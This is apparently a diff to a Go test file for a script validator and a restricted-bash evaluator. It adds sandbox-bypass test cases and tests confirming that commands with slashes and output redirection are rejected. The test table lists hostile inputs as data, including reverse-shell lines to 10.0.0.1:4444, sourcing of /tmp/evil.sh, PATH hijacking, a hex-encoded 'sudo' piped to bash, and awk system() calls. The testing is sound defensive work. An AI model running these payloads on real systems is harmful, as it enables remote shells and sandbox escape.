@@ -86,6 +86,19 @@ func TestValidateScript_BypassPatterns(t *testing.T) {
 		{"lua -e", "lua -e 'os.execute(\"id\")'"},
 		{"socat reverse shell", "socat -e /bin/bash 10.0.0.1:4444"},
 		{"bash /dev/udp", "bash -i >& /dev/udp/10.0.0.1/4444 0>&1"},
+		{"indirect expansion", `${!cmd}`},
+		{"substring extraction", `${PATH:0:1}`},
+		{"printf hex", `printf '\x73\x75\x64\x6f' | bash`},
+		{"export PATH", `export PATH=/tmp:$PATH`},
+		{"source script", `source /tmp/evil.sh`},
+		{"dot source", `. /tmp/evil.sh`},
+		{"sh -c bypass", `sh -c 'echo pwned'`},
+		{"dash -c bypass", `dash -c 'echo pwned'`},
+		{"bash -c bypass", `bash -c 'echo pwned'`},
+		{"zsh -c bypass", `zsh -c 'echo pwned'`},
+		{"awk system", `awk 'BEGIN{system("echo pwned")}'`},
+		{"gawk system", `gawk 'BEGIN{system("id")}'`},
+		{"mawk system", `mawk 'BEGIN{system("id")}'`},
 	}
 
 	for _, tc := range bypass {
@@ -245,6 +258,42 @@ func TestScriptEvaluator_Timeout(t *testing.T) {
 	require.Error(t, err)
 	assert.Contains(t, err.Error(), "timed out")
 	assert.Less(t, elapsed, 5*time.Second, "should timeout quickly")
+}
+
+func TestScriptEvaluator_RestrictedModePreventsSlashCommands(t *testing.T) {
+	eval := &ScriptEvaluator{}
+	ctx := context.Background()
+	evalCtx := &MapEvaluationContext{data: map[string]interface{}{}}
+
+	// In bash restricted mode, executing commands with slashes should fail
+	cond := &RuleCondition{
+		Type:           ConditionScript,
+		Language:       "bash",
+		Script:         "/usr/bin/env echo hello",
+		TimeoutSeconds: 5,
+	}
+
+	passed, err := eval.Evaluate(ctx, cond, evalCtx)
+	require.NoError(t, err)
+	assert.False(t, passed, "restricted bash should reject commands with path slashes")
+}
+
+func TestScriptEvaluator_RestrictedModePreventsRedirection(t *testing.T) {
+	eval := &ScriptEvaluator{}
+	ctx := context.Background()
+	evalCtx := &MapEvaluationContext{data: map[string]interface{}{}}
+
+	// In bash restricted mode, output redirection should fail
+	cond := &RuleCondition{
+		Type:           ConditionScript,
+		Language:       "bash",
+		Script:         "echo test > /tmp/testfile",
+		TimeoutSeconds: 5,
+	}
+
+	passed, err := eval.Evaluate(ctx, cond, evalCtx)
+	require.NoError(t, err)
+	assert.False(t, passed, "restricted bash should reject output redirection")
 }
 
 func TestScriptEvaluator_UnsupportedLanguage(t *testing.T) {
